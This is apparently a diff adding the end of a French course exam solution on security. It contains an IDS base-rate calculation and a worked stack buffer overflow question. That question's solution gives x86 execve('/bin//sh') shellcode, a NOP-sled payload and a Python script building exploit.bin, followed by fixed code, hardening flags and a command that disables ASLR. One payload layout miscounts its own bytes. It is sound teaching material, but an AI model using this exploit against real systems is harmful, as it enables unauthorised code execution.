+    \item \textbf{Réduire FPR :} Passer de 1\% à 0.1\% améliore drastiquement le PPV
+    \item \textbf{Corrélation :} Combiner plusieurs signaux indépendants
+    \item \textbf{Analyse comportementale :} Machine learning pour réduire FP
+    \item \textbf{Priorisation :} Trier les alertes par score de confiance
+\end{itemize}
+
+\textbf{Calcul avec FPR réduit (0.1\%) :}
+
+$$\Pr[\text{Alerte}] = 0.99 \times 0.001 + 0.001 \times 0.999 = 0.00198$$
+
+$$\Pr[\text{Attaque} | \text{Alerte}] = \frac{0.99 \times 0.001}{0.00198} \approx 0.5 = 50\%$$
+
+Réduire FPR d'un facteur 10 améliore le PPV de $9\% \to 50\%$ !
+\end{solution}
+
+%------------------------------------------------------------------------------
+\subsection{Question 3 : Dessin de Stack Frame (7 points)}
+%------------------------------------------------------------------------------
+
+\subsubsection{Énoncé}
+
+Considérez le code C suivant (architecture x86 32-bit) :
+
+\begin{verbatim}
+void process(int x, char *data) {
+    char buffer[32];
+    int counter = 0;
+    strcpy(buffer, data);
+    printf("Counter: %d\n", counter);
+}
+
+int main() {
+    char input[100];
+    gets(input);
+    process(42, input);
+    return 0;
+}
+\end{verbatim}
+
+\textbf{Questions :}
+\begin{enumerate}
+    \item Dessinez le stack frame complet de \texttt{process()} avec toutes les adresses relatives à EBP
+    \item Calculez l'offset exact pour atteindre l'adresse de retour depuis le début de \texttt{buffer}
+    \item Proposez un payload d'exploitation complet (en supposant ASLR désactivé)
+    \item Listez toutes les vulnérabilités présentes dans ce code
+\end{enumerate}
+
+\subsubsection{Solution}
+
+\begin{solution}
+\textbf{1. Stack frame de process()}
+
+\textbf{Layout mémoire détaillé (x86 32-bit) :}
+
+\begin{verbatim}
+Adresses hautes
++----------------------+ <- EBP + 12
+| Argument: data       | (char* pointer, 4 bytes)
++----------------------+ <- EBP + 8
+| Argument: x          | (int, valeur 42, 4 bytes)
++----------------------+ <- EBP + 4
+| Return Address       | <- CIBLE de l'attaque (4 bytes)
++----------------------+ <- EBP (Saved EBP)
+| Saved EBP            | (4 bytes)
++----------------------+ <- EBP - 4
+| counter (int)        | (valeur 0, 4 bytes)
++----------------------+ <- EBP - 8
+| padding (alignment)  | (0 bytes si compilateur aligne)
++----------------------+ <- EBP - 8
+| buffer[28-31]        |
+| buffer[24-27]        |
+| buffer[20-23]        |
+| buffer[16-19]        |
+| buffer[12-15]        |
+| buffer[8-11]         |
+| buffer[4-7]          |
+| buffer[0-3]          | <- Début buffer (EBP - 40)
++----------------------+ <- ESP (stack pointer courant)
+Adresses basses
+\end{verbatim}
+
+\textbf{Détails des offsets depuis EBP :}
+
+\begin{center}
+\begin{tabular}{|l|c|c|}
+\hline
+\textbf{Élément} & \textbf{Offset depuis EBP} & \textbf{Taille} \\
+\hline
+Argument data & EBP + 12 & 4 bytes \\
+Argument x & EBP + 8 & 4 bytes \\
+Return Address & EBP + 4 & 4 bytes \\
+Saved EBP & EBP & 4 bytes \\
+counter & EBP - 4 & 4 bytes \\
+buffer[32] & EBP - 40 à EBP - 9 & 32 bytes \\
+\hline
+\end{tabular}
+\end{center}
+
+\textbf{Note :} Le compilateur peut ajouter du padding pour aligner les variables. Ici, on suppose un alignement standard.
+
+\textbf{2. Calcul de l'offset}
+
+\textbf{Distance du début de buffer à return address :}
+
+\begin{itemize}
+    \item Début de buffer : EBP - 40
+    \item Return address : EBP + 4
+    \item Offset = (EBP + 4) - (EBP - 40) = 44 bytes
+\end{itemize}
+
+\textbf{Décomposition :}
+\begin{verbatim}
+| 32 bytes buffer | 4 bytes padding/counter | 4 bytes saved EBP | 4 bytes ret addr |
+|<--  buffer  -->||<----- 8 bytes gap ---->||<--- target --->|
+\end{verbatim}
+
+\textbf{Vérification :}
+\begin{itemize}
+    \item Buffer : 32 bytes
+    \item Counter : 4 bytes (EBP - 4)
+    \item Saved EBP : 4 bytes (EBP)
+    \item Return : 4 bytes (EBP + 4)
+    \item Total : $32 + 4 + 4 + 4 = 44$ bytes ✓
+\end{itemize}
+
+\textbf{3. Payload d'exploitation}
+
+\textbf{Stratégie :} Placer shellcode dans buffer et rediriger return address vers buffer.
+
+\textbf{Hypothèses :}
+\begin{itemize}
+    \item ASLR désactivé
+    \item NX bit désactivé (stack exécutable)
+    \item Pas de stack canaries
+    \item Adresse du buffer : supposons 0xbffff700 (typique sur Linux 32-bit)
+\end{itemize}
+
+\textbf{Shellcode Linux x86 (23 bytes) :}
+
+\begin{verbatim}
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
+\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+\end{verbatim}
+
+Code assembleur :
+\begin{lstlisting}[language={[x86masm]Assembler}]
+xor    %eax,%eax        # EAX = 0
+push   %eax             # NULL terminator
+push   $0x68732f2f      # "//sh"
+push   $0x6e69622f      # "/bin"
+mov    %esp,%ebx        # EBX = ptr to "/bin//sh"
+push   %eax             # argv[1] = NULL
+push   %ebx             # argv[0] = "/bin//sh"
+mov    %esp,%ecx        # ECX = argv
+mov    $0xb,%al         # EAX = 11 (execve)
+int    $0x80            # syscall
+\end{lstlisting}
+
+\textbf{Construction du payload :}
+
+\begin{verbatim}
+payload = b'\x90' * 9           # NOP sled (9 bytes)
+payload += shellcode            # Shellcode (23 bytes)
+payload += b'\x90' * (44 - 32)  # Padding jusqu'à return address
+payload += b'\x10\xf7\xff\xbf'  # Return addr: 0xbffff710 (milieu NOP)
+\end{verbatim}
+
+\textbf{Structure du payload (44 bytes total) :}
+
+\begin{verbatim}
+[9 NOPs][23 bytes shellcode][12 bytes padding][4 bytes @ret]
+|<-------------- 32 bytes buffer ------------>| 8 | 4 |
+                                              ^   ^   ^
+                                           counter saved ret
+                                                   EBP  addr
+\end{verbatim}
+
+\textbf{Adresse de retour :} On pointe vers le milieu du NOP sled (0xbffff710) pour tolérance.
+
+\textbf{Code Python complet :}
+
+\begin{verbatim}
+import struct
+
+# Shellcode execve("/bin//sh")
+shellcode = (
+    b"\x31\xc0"              # xor eax,eax
+    b"\x50"                  # push eax
+    b"\x68\x2f\x2f\x73\x68"  # push "//sh"
+    b"\x68\x2f\x62\x69\x6e"  # push "/bin"
+    b"\x89\xe3"              # mov ebx,esp
+    b"\x50"                  # push eax
+    b"\x53"                  # push ebx
+    b"\x89\xe1"              # mov ecx,esp
+    b"\xb0\x0b"              # mov al,0x0b
+    b"\xcd\x80"              # int 0x80
+)
+
+# Adresse du buffer (hypothétique)
+buffer_addr = 0xbffff700
+ret_addr = buffer_addr + 16  # Milieu du NOP sled
+
+# Construction payload
+nop_sled = b'\x90' * 9
+padding = b'A' * (32 - len(nop_sled) - len(shellcode))
+overflow = b'B' * 8  # Counter + Saved EBP
+ret_overwrite = struct.pack('<I', ret_addr)  # Little-endian
+
+payload = nop_sled + shellcode + padding + overflow + ret_overwrite
+
+print(f"Payload length: {len(payload)} bytes")
+print(f"Return address: 0x{ret_addr:08x}")
+
+# Écrire dans un fichier
+with open('exploit.bin', 'wb') as f:
+    f.write(payload)
+
+# Usage: (echo -ne "$(cat exploit.bin)"; cat) | ./vulnerable
+\end{verbatim}
+
+\textbf{4. Vulnérabilités présentes}
+
+\begin{enumerate}
+    \item \textbf{Buffer overflow dans process() :}
+    \begin{itemize}
+        \item \texttt{strcpy(buffer, data)} sans vérification de longueur
+        \item Buffer de 32 bytes peut être débordé
+        \item Permet écrasement de return address
+    \end{itemize}
+
+    \item \textbf{Utilisation de gets() dans main() :}
+    \begin{itemize}
+        \item \texttt{gets(input)} est \textbf{interdite} (deprecated depuis C11)
+        \item Aucune limite de taille
+        \item Permet buffer overflow de \texttt{input[100]}
+        \item Double vulnérabilité !
+    \end{itemize}
+
+    \item \textbf{Pas de validation des entrées :}
+    \begin{itemize}
+        \item Aucune vérification de \texttt{strlen(data)}
+        \item Aucun contrôle des caractères
+    \end{itemize}
+
+    \item \textbf{Format string potentielle :}
+    \begin{itemize}
+        \item Si \texttt{data} contient des \texttt{\%n}, \texttt{\%s}, etc.
+        \item \texttt{printf("Counter: \%d\textbackslash n", counter)} est sûr
+        \item Mais si on avait \texttt{printf(buffer)}, format string vuln
+    \end{itemize}
+
+    \item \textbf{Stack exécutable :}
+    \begin{itemize}
+        \item Si compilé sans \texttt{-z noexecstack}
+        \item Permet exécution du shellcode
+    \end{itemize}
+
+    \item \textbf{Pas de protections :}
+    \begin{itemize}
+        \item Pas de stack canaries (\texttt{-fstack-protector})
+        \item Pas d'ASLR (ou désactivé)
+        \item Pas de DEP/NX
+    \end{itemize}
+\end{enumerate}
+
+\textbf{Code corrigé :}
+
+\begin{verbatim}
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+#define MAX_INPUT 100
+
+void process(int x, const char *data) {
+    char buffer[32];
+    int counter = 0;
+
+    // Validation longueur
+    size_t len = strlen(data);
+    if (len >= sizeof(buffer)) {
+        fprintf(stderr, "Error: Input too long (%zu >= %zu)\n",
+                len, sizeof(buffer));
+        exit(1);
+    }
+
+    // Copie sécurisée
+    strncpy(buffer, data, sizeof(buffer) - 1);
+    buffer[sizeof(buffer) - 1] = '\0';
+
+    printf("Counter: %d\n", counter);
+}
+
+int main() {
+    char input[MAX_INPUT];
+
+    // Lecture sécurisée
+    if (fgets(input, sizeof(input), stdin) == NULL) {
+        fprintf(stderr, "Error reading input\n");
+        return 1;
+    }
+
+    // Enlever newline
+    input[strcspn(input, "\n")] = '\0';
+
+    process(42, input);
+    return 0;
+}
+\end{verbatim}
+
+\textbf{Compilation sécurisée :}
+
+\begin{verbatim}
+gcc -o secure \
+    -fstack-protector-all \     # Stack canaries
+    -D_FORTIFY_SOURCE=2 \       # Runtime checks
+    -pie -fPIE \                # Position independent
+    -Wl,-z,relro,-z,now \       # GOT protection
+    -Wl,-z,noexecstack \        # NX bit
+    -Wall -Wextra \             # All warnings
+    secure.c
+\end{verbatim}
+
+\begin{important}
+\textbf{Règles d'or :}
+\begin{enumerate}
+    \item \textbf{JAMAIS} \texttt{gets()}, \texttt{strcpy()}, \texttt{sprintf()}
+    \item Toujours \texttt{fgets()}, \texttt{strncpy()}, \texttt{snprintf()}
+    \item Valider les longueurs d'entrée
+    \item Compiler avec toutes les protections
+    \item Tester avec fuzzing et outils statiques (Valgrind, AddressSanitizer)
+\end{enumerate}
+\end{important}
+\end{solution}
+
+\newpage
+
+%==============================================================================
+\section{Annexe : Ressources et Références}
+%==============================================================================
+
+\subsection{Commandes de Vérification}
+
+\textbf{Vérifier les protections d'un binaire :}
+
+\begin{verbatim}
+# Linux
+checksec --file=./program
+
+# Manual check
+readelf -l ./program | grep GNU_STACK  # NX bit
+readelf -d ./program | grep BIND_NOW   # RELRO
+\end{verbatim}
+
+\textbf{Désactiver ASLR (pour tests seulement !) :}
+
+\begin{verbatim}
+# Temporaire
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+
+# Réactiver
+echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+\end{verbatim}
+
+\textbf{Trouver adresses avec GDB :}
+
+\begin{verbatim}
+gdb ./program
+(gdb) break process
+(gdb) run < input.txt
+(gdb) info frame        # Voir EBP, ESP
+(gdb) x/64x $esp        # Examiner stack
+(gdb) print &buffer     # Adresse buffer
+\end{verbatim}
+
+\subsection{Références}
+
+\begin{itemize}
+    \item \textbf{Cryptographie :} "The Joy of Cryptography" (Rosulek)
+    \item \textbf{Buffer Overflow :} "Smashing The Stack For Fun And Profit" (Aleph One)
+    \item \textbf{Network Security :} "Computer Security" (Stallings)
+    \item \textbf{OWASP Top 10 :} \url{https://owasp.org/Top10/}
+    \item \textbf{CWE :} \url{https://cwe.mitre.org/}
+\end{itemize}
+
+\end{document}
